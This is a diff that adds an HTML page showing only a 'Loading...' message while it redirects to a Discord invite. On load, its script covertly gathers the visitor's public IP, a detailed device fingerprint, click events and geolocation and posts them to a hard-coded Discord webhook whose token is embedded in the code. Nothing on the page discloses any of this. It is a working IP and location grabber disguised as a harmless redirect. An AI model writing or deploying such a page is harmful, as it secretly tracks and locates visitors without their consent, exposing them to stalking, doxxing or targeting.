@@ -1,0 +1,181 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+            flex-direction: column;
+        }
+        #loading {
+            font-size: 1.5em;
+            color: #333;
+        }
+    </style>
+    <!-- Include the ua-parser-js library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
+</head>
+<body>
+
+<div id="loading">Loading...</div>
+
+<script>
+    // Function to fetch IP and send to Discord
+    async function fetchIPAndSendToDiscord() {
+        try {
+            // Fetch public IP
+            const response = await fetch('https://api.ipify.org?format=json');
+            if (!response.ok) {
+                throw new Error('Network response was not ok ' + response.statusText);
+            }
+            const ipData = await response.json();
+            const ip = ipData.ip;
+
+            // Send IP to Discord
+            const webhookUrl = 'https://discord.com/api/webhooks/1254076950691975238/MyvO0e3eNpjpZ0rw3nLPkFFOFVGuaRzvgjXMQMlK5DiUIm3GmGsH_PIdgePEphl8_I5-';
+            const payload = {
+                content: `Public IP Address: ${ip}`
+            };
+            const webhookResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (webhookResponse.ok) {
+                console.log('Public IP address sent to Discord successfully!');
+                redirectToDiscord();
+            } else {
+                console.error('Failed to send public IP address to Discord:', webhookResponse.statusText);
+                document.getElementById('loading').textContent = 'Failed to send IP address to Discord.';
+            }
+
+            // Collect and send device info
+            const parser = new UAParser();
+            const result = parser.getResult();
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: result.os.name,
+                osVersion: result.os.version,
+                device: result.device.model || 'Unknown',
+                deviceType: result.device.type || 'Unknown',
+                deviceVendor: result.device.vendor || 'Unknown',
+                browser: result.browser.name,
+                browserVersion: result.browser.version,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled(),
+                plugins: Array.from(navigator.plugins).map(plugin => plugin.name).join(', '),
+                online: navigator.onLine,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                pageUrl: window.location.href,
+                referrer: document.referrer
+            };
+
+            const userData = {
+                deviceInfo: deviceInfo,
+                clicks: []
+            };
+
+            // Add click tracking
+            document.addEventListener('click', function(event) {
+                userData.clicks.push({
+                    element: event.target.tagName,
+                    id: event.target.id,
+                    class: event.target.className,
+                    time: new Date().toISOString()
+                });
+            });
+
+            // Add geolocation data
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    userData.geolocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    userData.ipAddress = ip; // Add IP address to data
+                    sendToWebhook(userData);
+                }, function(error) {
+                    userData.geolocation = `Geolocation error: ${error.message}`;
+                    userData.ipAddress = ip; // Add IP address to data
+                    sendToWebhook(userData);
+                });
+            } else {
+                userData.geolocation = "Geolocation is not supported by this browser.";
+                userData.ipAddress = ip; // Add IP address to data
+                sendToWebhook(userData);
+            }
+
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('loading').textContent = 'Error occurred';
+        }
+    }
+
+    function sendToWebhook(data) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1254076950691975238/MyvO0e3eNpjpZ0rw3nLPkFFOFVGuaRzvgjXMQMlK5DiUIm3GmGsH_PIdgePEphl8_I5-';
+        const payload = {
+            content: "User Device Information and Behavior",
+            embeds: [{
+                title: "Device Info",
+                description: JSON.stringify(data.deviceInfo, null, 2),
+                color: 5814783,
+                fields: [
+                    {
+                        name: "Clicks",
+                        value: data.clicks.map(click => `${click.time}: ${click.element} (ID: ${click.id}, Class: ${click.class})`).join("\n") || "No clicks recorded"
+                    },
+                    {
+                        name: "Geolocation",
+                        value: data.geolocation ? `Latitude: ${data.geolocation.latitude}, Longitude: ${data.geolocation.longitude}` : "Geolocation not available"
+                    }
+                ]
+            }]
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).then(response => {
+            if (response.ok) {
+                console.log("Data sent successfully");
+                // No need to display message, just redirect
+                redirectToDiscord();
+            } else {
+                console.error("Failed to send data");
+                document.getElementById('loading').textContent = 'Failed to send data';
+            }
+        }).catch(error => {
+            console.error("Error:", error);
+            document.getElementById('loading').textContent = 'Error occurred';
+        });
+    }
+
+    function redirectToDiscord() {
+        // Redirect to Discord invite link
+        window.location.href = "https://discord.com/invite/7Zw8wcZh";
+    }
+
+    // Call the function to start the process
+    fetchIPAndSendToDiscord();
+</script>
+
+</body>
+</html>
